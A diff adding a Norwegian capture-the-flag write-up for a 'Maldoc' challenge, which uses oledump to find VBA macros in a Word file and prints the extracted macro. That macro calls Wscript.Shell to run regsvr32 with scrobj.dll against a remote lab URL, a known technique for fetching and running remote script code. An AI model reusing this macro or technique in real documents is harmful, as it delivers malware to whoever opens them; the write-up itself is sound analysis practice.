@@ -87,4 +87,39 @@ MD5: 17395d6abdbc5482cf852c2712865cd1
 ## Challenge 9: Maldoc
 https://påskenøtter.helsectf.no/challenges#Registrert%20bibliotek
 
+Bruker oledump for å identifisere makroer. 
 
+Se [Challenge09](/challenge09) for output.
+
+```
+python3 oledump.py Overdue_Ticket_4825.doc 
+  1:       114 '\x01CompObj'
+  2:      4096 '\x05DocumentSummaryInformation'
+  3:      4096 '\x05SummaryInformation'
+  4:     10906 '1Table'
+  5:       408 'Macros/PROJECT'
+  6:        65 'Macros/PROJECTwm'
+  7: M    1957 'Macros/VBA/Module1'
+  8: m    1097 'Macros/VBA/ThisDocument'
+  9:      2703 'Macros/VBA/_VBA_PROJECT'
+ 10:      1234 'Macros/VBA/__SRP_0'
+ 11:       106 'Macros/VBA/__SRP_1'
+ 12:       220 'Macros/VBA/__SRP_2'
+ 13:        66 'Macros/VBA/__SRP_3'
+ 14:       570 'Macros/VBA/dir'
+ 15:    130309 'WordDocument'
+```
+
+Vi ser at stream 7+8 har makroer, vi dumper stream 7: 
+`/oledump.py -s 7 --vbadecompressskipattributes Overdue_Ticket_4825.doc > macro1.txt`
+
+Vi kan deretter lese makroen, og finner dette segmentet (cat macro1.txt):
+```vb
+Private Sub LetsGo()
+    Dim shell
+    Dim out
+    Set shell = VBA.CreateObjet("Wscript.Shell")
+    out = shell.Run("regsvr32 /u /n /s /i:http://this.url.looks.a.bit.phishy.lab/EGG{00099e44e9b6e8d4337cc29ccf436410}/ scrobj.dll", 0, False)
+End Sub
+```
+and our egg is `EGG{00099e44e9b6e8d4337cc29ccf436410}`.
